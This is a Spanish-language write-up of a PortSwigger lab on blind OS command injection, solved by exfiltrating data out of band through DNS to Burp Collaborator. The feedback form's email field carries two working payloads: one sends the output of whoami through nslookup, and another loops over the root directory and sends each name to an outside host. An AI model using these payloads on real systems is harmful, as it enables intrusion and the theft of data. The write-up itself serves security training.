---
title: OS Command Injection Lab 5
date: 2024-12-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - OS Command Injection
tags:
  - OS Command Injection
  - Blind OS command injection with out-of-band data exfiltration
image:
  path: /assets/img/OS-Command-Injection-Lab-5/Portswigger.png
---

## Skills

- Blind OS command injection with out-of-band data exfiltration

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `Blind OS Command Injection` en la `función` de `comentarios`. La aplicación `ejecuta` un `comando` en la `terminal` que incluye `datos` proporcionados por el `usuario`. El `comando` se ejecuta de forma `asíncrona` y no tiene efecto en la `respuesta` de la aplicación. No es posible `redireccionar` la `salida` a una `ubicación` accesible. Sin embargo, es posible desencadenar `out-of-band interactions` con un `dominio externo`. Para resolver el `laboratorio`, debemos ejecutar el `comando` `whoami` y exfiltra su `salida` mediante una `consulta DNS` a `Burp Collaborator`. Necesitaremos introducir el `nombre` del `usuario` actual para completar el `laboratorio`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/OS-Command-Injection-Lab-5/image_1.png)

Pulsamos en `Submit feedback` y vemos un `formulario`

![](/assets/img/OS-Command-Injection-Lab-5/image_2.png)

Hacemos `click` sobre `Submit feedback` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/OS-Command-Injection-Lab-5/image_3.png)

La `respuesta` obtenida son unas `llaves vacías {}`

![](/assets/img/OS-Command-Injection-Lab-5/image_4.png)

Nos dirigimos a `Burpsuite Collaborator` hacemos `click` en `Copy to clipboard`, debido a que no recibimos `ninguna respuesta` que indique que estamos `inyectando comandos`, esta es la única forma que podemos utilizar para ello, debemos usar este `payload` en los diferentes `campos` para ver si son `inyectables`

```
csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||nslookup+`whoami`.s6z1cmuo54u5lsajrthrckwd84ev2sqh.oastify.com||&subject=test&message=test
```

Si nos vamos a `Burpsuite Collaborator` nuevamente veremos que hemos obtenido `dos peticiones DNS` con el `output` del comando `whoami`

![](/assets/img/OS-Command-Injection-Lab-5/image_5.png)

Si necesitamos obtener más de una línea podemos usar este otro `payload` de `Hacktricks` [https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration](https://book.hacktricks.xyz/pentesting-web/command-injection#dns-based-data-exfiltration)

```
csrf=h2bWPuUAS3XRnSo6w2sMMhhnp9pXPlbe&name=test&email=||for+i+in+$(ls+/);+do+host+"$i.4gldmy40fg4hv4kv15r3mw6pigo7c50u.oastify.com";+done||&subject=test&message=test
```

Pulsamos en `Submit solution` e `introducimos` el nombre de usuario `peter-qflr5j`

![](/assets/img/OS-Command-Injection-Lab-5/image_6.png)
